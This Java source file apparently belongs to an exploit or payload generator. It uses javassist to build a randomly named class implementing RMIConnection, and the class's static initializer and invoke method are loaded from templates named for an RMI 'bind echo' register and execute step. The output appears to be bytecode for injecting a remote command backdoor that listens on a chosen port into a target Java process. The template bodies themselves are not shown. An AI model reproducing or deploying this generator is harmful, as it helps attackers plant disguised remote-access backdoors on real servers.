package com.generate;

import com.Main;
import com.dto.ClassDto;
import javassist.*;

import java.util.ArrayList;
import static com.Main.basePath;

public class RmiBind {

    public static ClassDto bind(String rmiExObjPort) throws Exception {
        ClassPool classPool = new ClassPool();
        classPool.insertClassPath(basePath + "/jdk/*");

        String readablePackageName = Utils.getReadablePackageName("");
        String readableClassName = Utils.getReadableClassName("");
        String className = readablePackageName + readableClassName;
        CtClass rmiBindEchoRegisterCtClass = classPool.makeClass(className);
        CtClass rmiConnectionCtClass = classPool.get("javax.management.remote.rmi.RMIConnection");

        rmiBindEchoRegisterCtClass.setInterfaces(new CtClass[]{rmiConnectionCtClass});

        CtConstructor rmiBindEchoRegisterCtConstructor = rmiBindEchoRegisterCtClass.makeClassInitializer();
        String staticBody = Utils.loadTempFile("/RmiBindEchoRegister.temp");
        staticBody = staticBody.replace("{{{className}}}", className);
        staticBody = staticBody.replace("{{{rmiExObjPort}}}", rmiExObjPort);

        rmiBindEchoRegisterCtConstructor.setBody(staticBody);

        //generate method
        String executerMethodDescirpt = "public Object invoke(javax.management.ObjectName name, String operationName, java.rmi.MarshalledObject params, String signature[], javax.security.auth.Subject delegationSubject) throws javax.management.InstanceNotFoundException,javax.management.MBeanException,javax.management.ReflectionException,java.io.IOException;";
        String executerMethodBody = Utils.loadTempFile("/RmiBindEchoExecute.temp");
        CtMethod executerMethodCtMethod = CtMethod.make(executerMethodDescirpt, rmiBindEchoRegisterCtClass);
        rmiBindEchoRegisterCtClass.addMethod(executerMethodCtMethod);
        executerMethodCtMethod.setBody(executerMethodBody);

        //add construct
        CtConstructor constructor = CtNewConstructor.make("public " + readableClassName + "() throws java.rmi.RemoteException{}", rmiBindEchoRegisterCtClass);
        constructor.setBody("{}");
        rmiBindEchoRegisterCtClass.addConstructor(constructor);

        rmiBindEchoRegisterCtClass.setModifiers(rmiBindEchoRegisterCtClass.getModifiers() & ~Modifier.ABSTRACT);
        rmiBindEchoRegisterCtConstructor.getMethodInfo().rebuildStackMap(classPool);

        return new ClassDto(className, "invoke", rmiBindEchoRegisterCtClass.toBytecode());
    }
}
